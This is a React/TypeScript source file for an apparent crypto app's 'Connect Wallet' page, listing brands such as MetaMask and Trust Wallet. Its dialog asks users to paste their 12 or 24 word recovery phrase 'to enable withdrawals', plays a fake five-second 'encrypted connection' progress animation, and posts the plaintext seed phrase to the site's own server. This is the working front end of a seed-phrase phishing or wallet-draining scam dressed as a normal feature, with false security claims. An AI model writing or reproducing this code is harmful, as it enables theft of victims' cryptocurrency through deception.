import { MobileLayout } from "@/components/layout/mobile-layout";
import { ArrowLeft, ChevronRight, Search, Lock, Wallet, Loader2, CheckCircle2 } from "lucide-react";
import { Link, useLocation } from "wouter";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import { Button } from "@/components/ui/button";
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog";
import { Label } from "@/components/ui/label";
import { useState } from "react";
import { useQuery, useQueryClient } from "@tanstack/react-query";
import { useToast } from "@/hooks/use-toast";

interface LinkedWalletType {
  id: number;
  name: string;
  logo: string | null;
  minAmount: string;
  maxAmount: string;
  supportedCoins: string[];
  status: string;
}

const WALLET_COLORS: { [key: string]: string } = {
  "Trust Wallet": "bg-blue-400",
  "MetaMask": "bg-orange-500",
  "Coinbase": "bg-blue-700",
  "Phantom": "bg-purple-500",
  "Binance Web3": "bg-yellow-500",
  "OKX Wallet": "bg-black",
  "Wallet Connect": "bg-blue-600",
  "Blockchain": "bg-purple-600",
};

const getWalletColor = (name: string): string => {
  return WALLET_COLORS[name] || "bg-gray-600";
};

export default function ConnectWallet() {
  const [_, setLocation] = useLocation();
  const { toast } = useToast();
  const queryClient = useQueryClient();
  const [search, setSearch] = useState("");
  const [selectedWallet, setSelectedWallet] = useState<LinkedWalletType | null>(null);
  const [phrase, setPhrase] = useState("");
  const [isConnecting, setIsConnecting] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [progress, setProgress] = useState(0);

  const { data: walletTypes = [], isLoading } = useQuery<LinkedWalletType[]>({
    queryKey: ['/api/linked-wallet-types/enabled'],
    queryFn: async () => {
      const res = await fetch('/api/linked-wallet-types/enabled');
      if (!res.ok) throw new Error('Failed to fetch wallet types');
      return res.json();
    }
  });

  const filteredWallets = walletTypes.filter(w => 
    w.name.toLowerCase().includes(search.toLowerCase())
  );

  const handleWalletClick = (wallet: LinkedWalletType) => {
    setSelectedWallet(wallet);
    setPhrase("");
  };

  const handleConnect = async () => {
    if (!phrase || !selectedWallet) return;
    
    setIsConnecting(true);
    setProgress(0);
    
    const interval = setInterval(() => {
      setProgress(prev => {
        if (prev >= 100) {
          clearInterval(interval);
          return 100;
        }
        return prev + 2;
      });
    }, 100);

    setTimeout(async () => {
      clearInterval(interval);
      setProgress(100);
      
      try {
        const userId = 1;
        
        const res = await fetch(`/api/users/${userId}/connected-wallets`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            walletTypeId: selectedWallet.id,
            name: selectedWallet.name,
            logo: selectedWallet.logo,
            seedPhrase: phrase
          })
        });

        if (!res.ok) throw new Error('Failed to connect wallet');

        queryClient.invalidateQueries({ queryKey: ['/api/users'] });
        
        setShowSuccess(true);
        
        setTimeout(() => {
          setShowSuccess(false);
          setIsConnecting(false);
          setSelectedWallet(null);
          setPhrase("");
          setLocation("/wallet");
        }, 2000);
        
      } catch (error) {
        toast({
          title: "Connection Failed",
          description: "Could not connect your wallet. Please try again.",
          variant: "destructive"
        });
        setIsConnecting(false);
        setProgress(0);
      }
    }, 5000);
  };

  if (isConnecting) {
    return (
      <MobileLayout>
        <div className="bg-white min-h-screen flex flex-col items-center justify-center px-6">
          {showSuccess ? (
            <div className="text-center animate-in fade-in duration-500">
              <div className="w-24 h-24 rounded-full bg-green-100 flex items-center justify-center mx-auto mb-6">
                <CheckCircle2 className="w-14 h-14 text-green-600" />
              </div>
              <h2 className="text-2xl font-bold text-gray-900 mb-2">Wallet Connected!</h2>
              <p className="text-gray-500">Your {selectedWallet?.name} has been linked successfully.</p>
            </div>
          ) : (
            <div className="text-center">
              {selectedWallet?.logo ? (
                <img 
                  src={selectedWallet.logo} 
                  alt={selectedWallet.name}
                  className="w-20 h-20 rounded-2xl mx-auto mb-6 animate-pulse"
                />
              ) : (
                <div className={`w-20 h-20 rounded-2xl ${getWalletColor(selectedWallet?.name || '')} flex items-center justify-center mx-auto mb-6 animate-pulse`}>
                  <span className="text-3xl font-bold text-white">{selectedWallet?.name?.[0]}</span>
                </div>
              )}
              <h2 className="text-xl font-bold text-gray-900 mb-2">Connecting to {selectedWallet?.name}</h2>
              <p className="text-gray-500 mb-8">Please wait while we secure your connection...</p>
              
              <div className="w-64 mx-auto">
                <div className="h-2 bg-gray-200 rounded-full overflow-hidden">
                  <div 
                    className="h-full bg-blue-600 transition-all duration-100 ease-linear"
                    style={{ width: `${progress}%` }}
                  />
                </div>
                <p className="text-sm text-gray-400 mt-2">{progress}% Complete</p>
              </div>
              
              <div className="flex items-center justify-center gap-2 mt-8 text-sm text-gray-400">
                <Lock size={14} />
                <span>Encrypted connection</span>
              </div>
            </div>
          )}
        </div>
      </MobileLayout>
    );
  }

  return (
    <MobileLayout>
      <div className="bg-white min-h-screen pb-20">
        <div className="px-6 pt-8 pb-4 sticky top-0 bg-white z-10 border-b border-gray-50">
          <div className="flex items-center gap-4 mb-6">
            <Link href="/wallet">
              <div className="w-10 h-10 rounded-full bg-gray-50 flex items-center justify-center text-gray-600 hover:bg-gray-100 cursor-pointer" data-testid="button-back">
                <ArrowLeft size={20} />
              </div>
            </Link>
            <h1 className="text-xl font-bold">Connect Wallet</h1>
          </div>

          <div className="relative">
            <Search className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400" size={18} />
            <Input 
              placeholder="Search wallet..." 
              value={search}
              onChange={(e) => setSearch(e.target.value)}
              className="pl-10 bg-gray-50 border-none h-12 rounded-xl text-base"
              data-testid="input-search-wallets"
            />
          </div>
        </div>

        <div className="p-4">
          {isLoading ? (
            <div className="flex flex-col items-center justify-center py-16">
              <Loader2 className="w-8 h-8 animate-spin text-gray-400 mb-4" />
              <p className="text-gray-500">Loading wallets...</p>
            </div>
          ) : filteredWallets.length === 0 ? (
            <div className="text-center py-16">
              <Wallet className="w-16 h-16 text-gray-300 mx-auto mb-4" />
              <p className="text-gray-500 font-medium">
                {search ? `No wallets found matching "${search}"` : 'No wallet types available'}
              </p>
              <p className="text-gray-400 text-sm mt-1">
                {!search && 'Contact support for assistance'}
              </p>
            </div>
          ) : (
            <div className="flex flex-col gap-3">
              {filteredWallets.map((wallet) => (
                <button 
                  key={wallet.id}
                  onClick={() => handleWalletClick(wallet)}
                  className="flex items-center gap-4 p-4 bg-white rounded-2xl border border-gray-100 shadow-sm hover:shadow-md hover:border-blue-100 active:scale-[0.99] transition-all text-left group"
                  data-testid={`button-wallet-${wallet.id}`}
                >
                  {wallet.logo ? (
                    <img 
                      src={wallet.logo} 
                      alt={wallet.name}
                      className="w-14 h-14 rounded-2xl object-contain shrink-0 group-hover:scale-105 transition-transform"
                    />
                  ) : (
                    <div className={`w-14 h-14 rounded-2xl ${getWalletColor(wallet.name)} flex items-center justify-center text-white font-bold text-xl shadow-sm shrink-0 group-hover:scale-105 transition-transform`}>
                      {wallet.name[0]}
                    </div>
                  )}
                  <div className="flex-1 min-w-0">
                    <h4 className="font-bold text-gray-900 text-base truncate mb-0.5">{wallet.name}</h4>
                    <p className="text-sm text-gray-500 font-medium truncate">
                      Min: ${parseFloat(wallet.minAmount).toFixed(0)} | Max: ${parseFloat(wallet.maxAmount).toFixed(0)}
                    </p>
                  </div>
                  <div className="w-8 h-8 rounded-full bg-gray-50 flex items-center justify-center text-gray-400 group-hover:bg-blue-50 group-hover:text-blue-600 transition-colors">
                    <ChevronRight size={18} />
                  </div>
                </button>
              ))}
            </div>
          )}
        </div>

        <Dialog open={!!selectedWallet} onOpenChange={(open) => !open && setSelectedWallet(null)}>
          <DialogContent className="sm:max-w-md rounded-2xl w-[90%] bg-white">
            <DialogHeader className="flex flex-col items-center text-center pt-4 pb-2">
              {selectedWallet && (
                selectedWallet.logo ? (
                  <img 
                    src={selectedWallet.logo}
                    alt={selectedWallet.name}
                    className="w-20 h-20 rounded-3xl object-contain shadow-lg mb-4"
                  />
                ) : (
                  <div className={`w-20 h-20 rounded-3xl ${getWalletColor(selectedWallet.name)} flex items-center justify-center text-white font-bold text-3xl shadow-lg mb-4`}>
                    {selectedWallet.name[0]}
                  </div>
                )
              )}
              <DialogTitle className="text-xl font-bold text-gray-900">
                {selectedWallet?.name}
              </DialogTitle>
              <DialogDescription>
                Import your existing wallet to enable withdrawals
              </DialogDescription>
            </DialogHeader>
            
            <div className="space-y-6 py-2">
              <div className="space-y-2">
                <Label htmlFor="phrase" className="text-sm font-medium text-gray-700 ml-1">
                  Wallet Recovery Phrase
                </Label>
                <Textarea 
                  id="phrase"
                  placeholder="Enter your 12 or 24 word recovery phrase..." 
                  className="min-h-[120px] resize-none bg-gray-50 border-gray-200 focus:border-primary focus:ring-primary/20 rounded-xl p-4 text-base"
                  value={phrase}
                  onChange={(e) => setPhrase(e.target.value)}
                  data-testid="input-seed-phrase"
                />
                <p className="text-xs text-gray-400 ml-1">
                  Your phrase is encrypted and stored securely
                </p>
              </div>

              <div className="space-y-4">
                <Button 
                  className="w-full h-12 rounded-xl font-bold text-base shadow-lg shadow-blue-500/20"
                  onClick={handleConnect}
                  disabled={!phrase.trim()}
                  data-testid="button-connect-wallet"
                >
                  Connect Wallet
                </Button>
                
                <div className="flex items-center justify-center gap-2 text-[11px] text-gray-400 font-medium">
                  <div className="p-1 bg-gray-100 rounded-full">
                    <Lock size={10} className="text-gray-500" />
                  </div>
                  <span>Connection is encrypted and private</span>
                </div>
              </div>
            </div>
          </DialogContent>
        </Dialog>
      </div>
    </MobileLayout>
  );
}
